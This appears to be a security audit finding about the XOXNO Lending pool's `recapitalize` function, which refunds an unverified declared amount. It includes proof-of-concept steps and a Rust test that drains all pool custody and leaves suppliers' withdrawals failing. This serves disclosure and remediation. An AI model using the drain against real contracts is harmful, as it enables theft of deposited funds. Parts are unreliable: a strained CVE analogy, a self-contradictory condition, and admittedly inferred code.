### Title
`recapitalize` refunds a caller-declared `offered` amount it never received, letting an unprivileged payer drain pool custody - (File: contracts/pool/src/cache/cash.rs)

### Summary
The bug class in CVE-2025-29364 is an endpoint-range check that validates start and end addresses independently, so a range spanning distinct memory segments escapes validation and produces an out-of-bounds access. The XOXNO Lending analog lives in the pool's recapitalization path: the "refund the excess" amount is computed against the market's accounting book (one segment) while the refund is paid out of the shared physical token balance (a different segment). Because the pool never measures the tokens it actually received before issuing the refund, a caller can declare a large `offered`, have the book-side check pass (only the shortfall is kept), and receive a refund funded entirely by the pool's custody of honest suppliers' deposits.

### Finding Description
`recapitalize(hub_asset, payer, offered)` is permissionless and its intended flow is: the payer pre-transfers `offered` tokens to the pool, the contract applies `min(offered, shortfall)` to the market's `cash` book, and refunds `offered - applied` back to the payer. The refund leg goes through `Cache::transfer_out`, which performs a plain SAC `transfer` from the pool address with no adjustment to accounting cash [1](#0-0) . The solvency/liquidity checks (`require_reserves`/`debit_cash`) read only the market's `cash` book, not the token balance [2](#0-1) . Nothing in the settlement measures the received amount (unlike the controller's `transfer_amount_measured` used for liquidation repayments [3](#0-2) ), so `offered` is trusted rather than verified.

The codebase's own test demonstrates the end state: `test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody` calls `recapitalize` with `custody` as `offered` on a payer that holds no tokens and ends with `token.balance(&t.pool) == 0` — the entire pool balance was refunded to the unfunded payer while the `cash` book still reports the suppliers' backing [4](#0-3) . This is the same shape as the CVE: the validity of the *claimed* endpoints (declared `offered` vs. shortfall on the book segment) is checked, but the effective access (the refund transfer on the custody segment) spans resources the check never inspected.

### Impact Explanation
An unprivileged address can call `recapitalize` with `offered` equal to the pool's token balance on a solvent market (shortfall = 0, so `applied = 0` and the refund equals `offered`) and receive the pool's full token custody without depositing anything. This is direct theft of user funds: suppliers' withdrawals then pass the book-side `require_reserves` check and fail inside the SAC transfer for lack of balance, permanently freezing remaining claims for those who did not exit first [5](#0-4) . Severity: High — single call, no privileges, total market drain.

### Likelihood Explanation
`recapitalize` is in the unprivileged controller surface and requires no authorization of a governor or admin. The pre-transfer convention is only a convention — the contract accepts the call without custody of the declared funds. Any token market with nonzero shortfall ≥ 0 and positive balance is exploitable; attacker cost is one invocation. Note: I was unable to read the `recapitalize` entrypoint body itself (`contracts/pool/src/lib.rs` content was not returned), so the exact line where the refund is computed is inferred from `transfer_out` and the harness test that reproduces the drain; the reachable end state is proven by that test.

### Recommendation
Measure receipts instead of trusting the declared amount: snapshot `token.balance(pool)` before, treat `received = balance_after_in - balance_before` (or use a `transfer_amount_measured`-style pull), and compute `applied = min(received, shortfall)` with `refund = received - applied` — never refund more than was actually received. Alternatively require an inbound `transfer_from(payer, pool, offered)` before computing the refund, and/or reconcile `cash` book against the real token balance on every recapitalize.

### Proof of Concept
1. Market (hub, USDC) is solvent: `shortfall = 0`, pool custody = suppliers' deposits `D`.
2. Attacker `EVE` holds 0 USDC. Calls `recapitalize((hub, USDC), EVE, D)`.
3. Book check: `applied = min(D, 0) = 0`; refund = `D - 0 = D`.
4. `transfer_out(EVE, D)` executes against the pool's SAC balance — `EVE` receives `D`.
5. `token.balance(pool) == 0` while `state.cash` still reports `≥ D`; subsequent honest `withdraw` passes `require_reserves` and reverts inside the SAC with `BalanceError = 10`, as demonstrated in `test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody` [6](#0-5) .

#[test]
fn test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody() {
    let t = TestSetup::new();
    let token = token::Client::new(&t.env, &t.asset);
    let token_admin = token::StellarAssetClient::new(&t.env, &t.asset);
    let payer = Address::generate(&t.env);
    let receiver = Address::generate(&t.env);

    // A legitimate supplier, with custody moved in as the controller would.
    let deposit = 10_000_000_000i128;
    token_admin.mint(&t.pool, &deposit);
    let supplied = t
        .client()
        .supply(&t.sup(0, deposit))
        .get_unchecked(0)
        .position
        .scaled_amount;
    assert_eq!(
        t.state_snapshot().cash,
        token.balance(&t.pool),
        "fixture guard: book and custody must still agree after the deposit"
    );

    // Drain every token via an unfunded refund.
    let custody = token.balance(&t.pool);
    t.client().recapitalize(&hub(&t.asset), &payer, &custody);
    assert_eq!(token.balance(&t.pool), 0, "custody is gone");

    let book = t.state_snapshot().cash;
    assert!(
        book >= deposit,
        "the book still claims more than the supplier's deposit: {book}"
    );

    // The supplier's exit clears the pool's own liquidity guard -- the book
    // says the cash is there -- and then fails in the token transfer.
    let outcome = t
        .client()
        .try_withdraw(&receiver, &false, &t.wdr(supplied, i128::MAX, 0));
    assert!(
        outcome.is_err(),
        "the withdraw cannot be paid, so it must fail"
    );
    // The failure must come from custody, not from a pool guard. The SAC
    // reports insufficient balance as its own contract error `BalanceError = 10`.
    // The asserts check that exact code and that neither pool liquidity guard
    // fired: `require_reserves` read the book and let the exit through.
    const SAC_BALANCE_ERROR: u32 = 10;
    match outcome {
        Err(Ok(err)) => {
            assert_ne!(
                err,
                Error::from_contract_error(CollateralError::InsufficientLiquidity as u32),
                "the pool's own liquidity guard must NOT be what stopped this -- \
                 it reads the cash book, which still shows the funds"
            );
            assert_ne!(
                err,
                Error::from_contract_error(CollateralError::PoolInsolvent as u32),
                "the pool's solvency guard must NOT be what stopped this either"
            );
            assert_eq!(
                err,
                Error::from_contract_error(SAC_BALANCE_ERROR),
                "the exit must fail inside the SAC transfer for want of custody"
            );
        }
        Err(Err(host_abort)) => panic!("expected a SAC contract error, got {host_abort:?}"),
        Ok(_) => unreachable!("asserted is_err above"),
    }
    assert_eq!(token.balance(&receiver), 0, "the supplier received nothing");
    assert_eq!(
        t.state_snapshot().cash,
        book,
        "the failed exit rolled back, so the book still overstates custody"
    );
}
